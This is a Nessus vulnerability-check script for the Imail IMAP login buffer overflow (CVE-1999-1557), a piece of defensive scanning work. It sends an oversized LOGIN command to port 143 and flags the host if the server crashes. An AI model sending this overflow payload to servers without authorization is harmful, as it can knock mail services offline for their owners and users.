#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10123);
 script_version ("$Revision: 1.24 $");
 script_cve_id("CVE-1999-1557");
 script_bugtraq_id(502);
 script_xref(name:"OSVDB", value:"10842");

 script_name(english:"Imail IMAP Server Login Functions Remote Overflow");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote IMAP server is affected by a buffer overflow vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Imail IMAP server. The installed version is
affected by a buffer overflow when handling a long user name, or a
long password. An attacker, exploiting this flaw, could cause a denial
of service, or possibly execute arbitrary code subject to the
permissions of the IMAP server." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=92038879607336&w=2" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Imail 5.0.3 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
 
script_end_attributes();

 script_summary(english:"Imail's imap buffer overflow"); 
 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");
 script_dependencie("find_service1.nasl", "imap_overflow.nasl");
 script_exclude_keys("imap/false_imap", "imap/overflow");
 script_require_ports("Services/imap", 143);
 exit(0);
}

#
# The script code starts here
#

f = get_kb_item("imap/false_imap");
if(f)exit(0);
port = get_kb_item("Services/imap");
bof = get_kb_item("imap/overflow");
if(bof)exit(0);

if(!port)port = 143;
if(get_port_state(port))
{
 data = string("X LOGIN ", crap(1200), " ", crap(1300), "\r\n");
 soc = open_sock_tcp(port);
 if(soc > 0)
 {
  buf = recv_line(socket:soc, length:1024);
  if ( "imail" >!< tolower(buf) ) exit(0);
 if(!strlen(buf))
 	{ 
	 	close(soc);
		exit(0);
	}
  send(socket:soc, data:data);
  buf = recv_line(socket:soc, length:1024);
  if(!strlen(buf)){
  	security_hole(port);
	set_kb_item(name:"imap/overflow_imail", value:TRUE);
	}
  close(soc);
 }
}
